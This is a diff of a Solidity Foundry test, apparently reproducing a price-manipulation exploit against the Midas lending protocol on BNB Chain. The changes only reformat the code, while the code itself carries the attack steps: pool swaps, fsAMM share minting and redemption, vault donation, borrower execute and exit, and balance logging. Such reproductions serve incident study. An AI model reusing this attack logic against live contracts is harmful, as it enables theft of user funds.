@@ -67,29 +67,21 @@ contract MidasXYZExploit is Test {
         deal(address(BUSDT), address(this), 23_000e18);
 
         emit log_named_decimal_uint(
-            "Exploiter ankrBNB balance before attack",
-            ankrBNB.balanceOf(address(this)),
-            ankrBNB.decimals()
+            "Exploiter ankrBNB balance before attack", ankrBNB.balanceOf(address(this)), ankrBNB.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter ANKR balance before attack",
-            ANKR.balanceOf(address(this)),
-            ANKR.decimals()
+            "Exploiter ANKR balance before attack", ANKR.balanceOf(address(this)), ANKR.decimals()
         );
 
         ankrBNB_ANKRV2.swap(0, ANKR.balanceOf(address(ankrBNB_ANKRV2)) - 1, address(this), bytes("_"));
 
         emit log_named_decimal_uint(
-            "Exploiter ANKR balance after attack",
-            ANKR.balanceOf(address(this)),
-            ANKR.decimals()
+            "Exploiter ANKR balance after attack", ANKR.balanceOf(address(this)), ANKR.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter ankrBNB balance after attack",
-            ankrBNB.balanceOf(address(this)),
-            ankrBNB.decimals()
+            "Exploiter ankrBNB balance after attack", ankrBNB.balanceOf(address(this)), ankrBNB.decimals()
         );
     }
 
@@ -106,10 +98,10 @@ contract MidasXYZExploit is Test {
         uint256 liquidityMinted = transferTokensAndMintLiqudity(20_000e18);
         HAY_BUSDT.approve(address(fsAMM_HAY_BUSD), type(uint256).max);
         fsAMM_HAY_BUSD.mint(liquidityMinted);
-        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1_001);
+        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1001);
         HAY_BUSDT.approve(address(HAY_BUSDT_Vault), type(uint256).max);
         HAY_BUSDT_Vault.deposit(HAY_BUSDT.balanceOf(address(this)), address(fsAMM_HAY_BUSD));
-        fsAMM_HAY_BUSD.transfer(address(borrower), 1_001);
+        fsAMM_HAY_BUSD.transfer(address(borrower), 1001);
         borrower.execute();
         Minter minter = new Minter();
         ankrBNB.transfer(address(minter), 115e18);
@@ -123,13 +115,7 @@ contract MidasXYZExploit is Test {
             bytes("")
         );
 
-        WBNB_BUSDT.swap(
-            address(this),
-            true,
-            int256(WBNB.balanceOf(address(this)) - 1e18),
-            sqrtPriceLimitX96,
-            bytes("")
-        );
+        WBNB_BUSDT.swap(address(this), true, int256(WBNB.balanceOf(address(this)) - 1e18), sqrtPriceLimitX96, bytes(""));
         liquidityMinted = transferTokensAndMintLiqudity(HAY.balanceOf(address(this)));
         HAY_BUSDT_Vault.deposit(liquidityMinted, address(fsAMM_HAY_BUSD));
         borrower.exit();
@@ -145,8 +131,10 @@ contract MidasXYZExploit is Test {
         WBNB.transfer(msg.sender, uint256(amount0Delta));
     }
 
-    function transferTokensAndMintLiqudity(uint256 amount) private returns (uint256 liquidity) {
-        (uint112 reserveHAY, uint112 reserveBUSDT, ) = HAY_BUSDT.getReserves();
+    function transferTokensAndMintLiqudity(
+        uint256 amount
+    ) private returns (uint256 liquidity) {
+        (uint112 reserveHAY, uint112 reserveBUSDT,) = HAY_BUSDT.getReserves();
         uint256 transferAmountBUSDT = (amount * reserveBUSDT) / reserveHAY;
         HAY.transfer(address(HAY_BUSDT), amount);
         BUSDT.transfer(address(HAY_BUSDT), transferAmountBUSDT);
